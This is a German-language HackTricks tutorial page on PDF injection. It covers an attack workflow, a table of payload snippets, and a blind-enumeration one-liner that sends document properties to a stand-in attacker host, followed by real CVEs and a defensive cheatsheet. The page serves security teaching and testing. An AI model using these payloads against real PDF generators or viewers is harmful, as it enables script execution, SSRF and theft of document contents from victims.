# PDF Injection

{{#include ../../banners/hacktricks-training.md}}

**Wenn Ihre Eingabe in einer PDF-Datei reflektiert wird, können Sie versuchen, PDF-Daten einzufügen, um JavaScript auszuführen, SSRF durchzuführen oder den PDF-Inhalt zu stehlen.**
Die PDF-Syntax ist extrem permissiv – wenn Sie aus der Zeichenkette oder dem Wörterbuch, das Ihre Eingabe einbettet, ausbrechen können, können Sie völlig neue Objekte (oder neue Schlüssel im selben Objekt) anhängen, die Acrobat/Chrome gerne parsen wird.
Seit 2024 hat eine Welle von Bug-Bounty-Berichten gezeigt, dass *eine nicht escaped Klammer oder ein Backslash ausreicht*, um vollständige Skriptausführung zu ermöglichen.

## TL;DR – Moderner Angriffs-Workflow (2024)
1. Finden Sie einen beliebigen benutzerkontrollierten Wert, der in einer **(Klammerzeichenfolge)**, `/URI ( … )` oder `/JS ( … )`-Feld in der generierten PDF endet.
2. Injizieren Sie `) ` (schließen Sie die Zeichenfolge) gefolgt von einem der untenstehenden Primitiven und beenden Sie mit einer weiteren öffnenden Klammer, um die Syntax gültig zu halten.
3. Liefern Sie die bösartige PDF an ein Opfer (oder an einen Backend-Dienst, der die Datei automatisch rendert – großartig für blinde Bugs).
4. Ihr Payload wird im PDF-Viewer ausgeführt:
* Chrome / Edge → PDFium Sandbox
* Firefox → PDF.js (siehe CVE-2024-4367)
* Acrobat → Vollständige JavaScript-API (kann beliebige Dateiinhalte mit `this.getPageNthWord` exfiltrieren)

Beispiel (Annotation Link Hijack):
```pdf
(https://victim.internal/) ) /A << /S /JavaScript /JS (app.alert("PDF pwned")) >> /Next (
```
*Die erste `)` schließt den ursprünglichen URI-String, dann fügen wir ein neues **Action**-Wörterbuch hinzu, das Acrobat ausführt, wenn der Benutzer auf den Link klickt.*

## Nützliche Injektionsprimitive
| Ziel | Payload-Snippet | Anmerkungen |
|------|-----------------|-------------|
| **JavaScript beim Öffnen** | `/OpenAction << /S /JavaScript /JS (app.alert(1)) >>` | Wird sofort ausgeführt, wenn das Dokument geöffnet wird (funktioniert in Acrobat, nicht in Chrome). |
| **JavaScript beim Link** | `/A << /S /JavaScript /JS (fetch('https://attacker.tld/?c='+this.getPageNumWords(0))) >>` | Funktioniert in PDFium & Acrobat, wenn Sie eine `/Link`-Annotation kontrollieren. |
| **Blinde Datenexfiltration** | `<< /Type /Action /S /URI /URI (https://attacker.tld/?leak=)` | Kombinieren Sie mit `this.getPageNthWord` innerhalb von JS, um Inhalte zu stehlen. |
| **Server-seitiges SSRF** | Dasselbe wie oben, aber zielen Sie auf eine interne URL – großartig, wenn das PDF von Backoffice-Diensten gerendert wird, die `/URI` respektieren. |
| **Zeilenumbruch für neue Objekte** | `\nendobj\n10 0 obj\n<< /S /JavaScript /JS (app.alert(1)) >>\nendobj` | Wenn die Bibliothek Ihnen erlaubt, Zeilenumbrüche einzufügen, können Sie völlig neue Objekte erstellen. |

## Blinder Enumerations-Trick
Gareth Heyes (PortSwigger) veröffentlichte eine Einzeiler, der jedes Objekt in einem unbekannten Dokument auflistet – nützlich, wenn Sie das generierte PDF nicht sehen können:
```pdf
) /JS (for(i in this){try{this.submitForm('https://x.tld?'+i+'='+this[i])}catch(e){}}) /S /JavaScript /A << >> (
```
Der Code durchläuft das Acrobat DOM und führt ausgehende Anfragen für jedes Property/Wert-Paar aus, was Ihnen einen *JSON-ähnlichen* Dump der Datei gibt.  
Siehe das Whitepaper „Portable Data **ex**Filtration“ für die vollständige Technik.

## Real-World Bugs (2023-2025)
* **CVE-2024-4367** – Arbiträre JavaScript-Ausführung in Firefox’s PDF.js vor 4.2.67 umging den Sandbox mit einer gestalteten `/JavaScript`-Aktion.
* **Bug bounty 2024-05** – Ein großes Fintech erlaubte vom Kunden bereitgestellte Rechnungsnotizen, die in `/URI` landeten; der Bericht wurde mit 10.000 $ vergütet, nachdem ein SSRF zu einem internen Metadaten-Host unter Verwendung von `file:///` URI demonstriert wurde.
* **CVE-2023-26155** – `node-qpdf` Befehlseinspritzung über unsanierten PDF-Pfad zeigt die Wichtigkeit des Escapens von Rückwärtsschrägstrichen und Klammern, selbst *vor* der PDF-Ebene.

## Defensive Cheatsheet
1. **Kombinieren Sie niemals rohe Benutzereingaben** innerhalb von `(`…`)`-Strings oder Namen. Escapen Sie `\`, `(`, `)` wie von §7.3 der PDF-Spezifikation gefordert oder verwenden Sie Hex-Strings `<...>`.
2. Wenn Sie Links erstellen, bevorzugen Sie `/URI (https://…)`, die Sie *vollständig* URL-encodieren; blockieren Sie `javascript:`-Schemes in Client-Viewern.
3. Entfernen oder validieren Sie `/OpenAction`, `/AA` (zusätzliche Aktionen), `/Launch`, `/SubmitForm` und `/ImportData`-Dictionaries beim Nachbearbeiten von PDFs.
4. Auf der Serverseite, rendern Sie nicht vertrauenswürdige PDFs mit einem *headless converter* (z.B. qpdf –decrypt –linearize), der JavaScript und externe Aktionen entfernt.
5. Halten Sie PDF-Viewer auf dem neuesten Stand; PDF.js < 4.2.67 und Acrobat Reader vor Juli 2024 erlauben triviale Codeausführung.

## References
* Gareth Heyes, “Portable Data exFiltration – XSS for PDFs”, PortSwigger Research (aktualisiert Mai 2024). <https://portswigger.net/research/portable-data-exfiltration>
* Dawid Ryłko, “CVE-2024-4367: Arbitrary JavaScript Execution in PDF.js” (Apr 2024). <https://dawid.dev/sec/cve-2024-4367-arbitrary-javascript-execution-in-pdf-js>
{{#include ../../banners/hacktricks-training.md}}
